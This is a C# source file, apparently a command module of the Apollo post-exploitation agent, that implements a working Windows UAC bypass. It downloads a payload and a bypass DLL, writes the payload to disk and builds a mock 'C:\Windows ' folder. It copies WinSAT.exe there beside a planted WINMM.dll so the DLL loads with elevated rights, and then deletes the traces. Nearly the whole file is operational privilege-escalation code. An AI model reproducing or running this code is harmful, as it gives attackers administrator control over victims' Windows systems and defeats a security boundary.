#define COMMAND_NAME_UPPER

#if DEBUG
#undef BYPASSUAC
#define BYPASSUAC
#endif

#if BYPASSUAC
using System;
using System.Collections.Generic;
using System.ComponentModel;
using Apollo.Jobs;
using System.IO;
using System.Linq;
using static Native.Methods;
using static Native.Structures;
using System.Runtime.InteropServices;
using System.Threading;
using Apollo.Tasks;
using Native;
using Newtonsoft.Json;

namespace Apollo.CommandModules
{
    class BypassUac
    {
        private class BypassUacParams
        {
            public string BypassDll { get; set; }
            public string TargetPath { get; set; }
            public string Payload { get; set; }
        }

        public static void Execute(Job job, Agent agent)
        {
            Task task = job.Task;
            string path = task.parameters;

            BypassUacParams args = JsonConvert.DeserializeObject<BypassUacParams>(task.parameters);

            var payloadBytes = agent.Profile.GetFile(task.id, args.Payload, agent.Profile.ChunkSize);
            var bypassUacDllBytes = agent.Profile.GetFile(task.id, args.BypassDll, agent.Profile.ChunkSize);

            if (payloadBytes == null || payloadBytes.Length == 0)
            {
                job.SetError($"Could not retrieve payload bytes: null or length is 0.");
                return;
            }

            if (bypassUacDllBytes == null || bypassUacDllBytes.Length == 0)
            {
                job.AddOutput($"Could not retrieve bypass DLL bytes: null or length is 0.");
                return;
            }




            //Disable filesystem redirection
            IntPtr wow64Value = IntPtr.Zero;
            Wow64DisableWow64FsRedirection(ref wow64Value);

            if (!File.Exists(@"C:\Windows\system32\WinSAT.exe"))
            {
                job.SetError($"WinSAT.exe not found in the System32 folder. Bypassing not possible.");
                Wow64RevertWow64FsRedirection(wow64Value);
                return;
            }


            try
            {
                File.WriteAllBytes(Environment.ExpandEnvironmentVariables(args.TargetPath), payloadBytes);
            }
            catch (Exception e)
            {
                job.SetError($"Failed to write file to {args.TargetPath}. Reason: {e.Message}");
                Wow64RevertWow64FsRedirection(wow64Value);
                return;
            }

            var windir = @"C:\Windows ";

            try
            {
                CreateMockDirectory(windir, @"WinSAT.exe", @"WINMM.dll", bypassUacDllBytes);
                ShellExecute(windir + "\\System32\\WinSAT.exe", "mem -maxt 1");
                Thread.Sleep(2000);
            }
            catch (Exception e)
            {
                job.SetError($"Error executing bypass. Reason: {e.Message}");
                Wow64RevertWow64FsRedirection(wow64Value);
                return;
            }

            var cleanupFailed = new List<string>();
            if (!DeleteFileW(windir + @"\System32\winsat.exe"))
                cleanupFailed.Add(windir + @"\System32\winsat.exe");

            if (!DeleteFileW(windir + @"\System32\WINMM.dll"))
                cleanupFailed.Add(windir + @"\System32\WINMM.dll");

            if (!RemoveDirectory(@"\\?\" + windir + @"\System32\"))
                cleanupFailed.Add(@"\\?\" + windir + @"\System32\");

            if (!RemoveDirectory(@"\\?\" + windir + @"\"))
                cleanupFailed.Add(@"\\?\" + windir + @"\");

            Wow64RevertWow64FsRedirection(wow64Value);


            if (cleanupFailed.Any())
            {
                job.SetError("BypassUac executed successfully. Failed to cleanup the following files: " + String.Join(", ", cleanupFailed.ToArray()));
            }
            else
            {
                job.SetComplete("BypassUac executed successfully");
            }
        }

        private static Exception NewFormattedWin32Exception(string message, int errorCode)
        {
            return new Exception($"{message}: Error {errorCode} - {new Win32Exception(errorCode)}");
        }

        private static void CreateMockDirectory(string windir, string whitelistedExe, string dllName, byte[] bypassDllBytes)
        {
            if (!CreateDirectory(@"\\?\" + windir + @"\", IntPtr.Zero))
                throw NewFormattedWin32Exception(@"Could not create mock C:\Windows directory. CreateDirectory failed", Marshal.GetLastWin32Error());

            if (!CreateDirectory(@"\\?\" + windir + @"\System32\", IntPtr.Zero))
                throw NewFormattedWin32Exception(@"Could not create mock C:\Windows\system32 directory. CreateDirectory failed", Marshal.GetLastWin32Error());

            if (!CopyFile(@"C:\Windows\System32\" + whitelistedExe, @"\\?\" + windir + @"\System32\" + whitelistedExe, true))
                throw NewFormattedWin32Exception($"Could not copy {whitelistedExe} to mock system32 folder. CopyFile failed", Marshal.GetLastWin32Error());


            uint lenWritten = 0;
            NativeOverlapped overLap = new NativeOverlapped();
            IntPtr fileHandle = CreateFile(@"\\?\" + windir + "\\System32\\" + dllName, 0x10000000, 0x00000001, IntPtr.Zero, 4, 0x00000080, IntPtr.Zero);

            if (fileHandle == new IntPtr(-1))
            {
                Exception e = NewFormattedWin32Exception($"Could not get handle bypass DLL to mock system32. CreateFile failed", Marshal.GetLastWin32Error());
                CloseHandle(fileHandle);
                throw e;
            }

            if (!WriteFile(fileHandle, bypassDllBytes, bypassDllBytes.Length, out lenWritten, ref overLap))
            {
                Exception e = NewFormattedWin32Exception($"Could not write bypass DLL to mock system32. WriteFile failed", Marshal.GetLastWin32Error());
                CloseHandle(fileHandle);
                throw e;
            }

            CloseHandle(fileHandle);
        }

        private static void ShellExecute(string lpFile, string lpParameters)
        {
            SHELLEXECUTEINFO info = new SHELLEXECUTEINFO();
            info.cbSize = Marshal.SizeOf(info);
            info.lpFile = lpFile;
            info.lpParameters = lpParameters;
            info.lpDirectory = null;
            info.nShow = 2;
            info.hwnd = IntPtr.Zero;

            if (!ShellExecuteEx(ref info))
                throw NewFormattedWin32Exception($"ShellExecute failed when trying to start {lpFile}", Marshal.GetLastWin32Error());
        }
    }
}
#endif